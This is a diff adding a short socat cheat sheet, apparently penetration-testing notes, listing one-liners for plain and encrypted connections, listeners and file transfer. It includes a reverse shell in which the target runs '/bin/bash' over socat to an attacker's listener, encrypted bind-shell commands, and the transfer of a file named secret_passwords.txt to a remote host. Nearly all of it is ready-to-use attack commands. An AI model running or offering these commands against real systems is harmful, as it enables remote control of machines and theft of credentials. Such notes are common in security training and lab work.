@@ -1,0 +1,17 @@
+
+connect to 192.168.0.1 on port 80 : socat - TCP4:192.168.0.1:80
+
+listen on port 443 : sudo socat TCP4-LISTEN:443 STDOUT
+
+file transfer : sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+
+recieve file : socat TCP4:192.168.0.1:443 file:received_secret_passwords.txt,create
+
+reverse shell :
+  attacker : socat -d -d TCP4-LISTEN:443 STDOUT
+  target : socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+
+connect to 192.168.197.52:32794 with encryption : socat - OPENSSL:192.168.197.52:32794,cert=bind_shell.pem,verify=0
+
+listen on 1337 with encryption : sudo socat -d -d OPENSSL-LISTEN:1337,cert=bind_shell.pem,verify=0 STDOUT
+
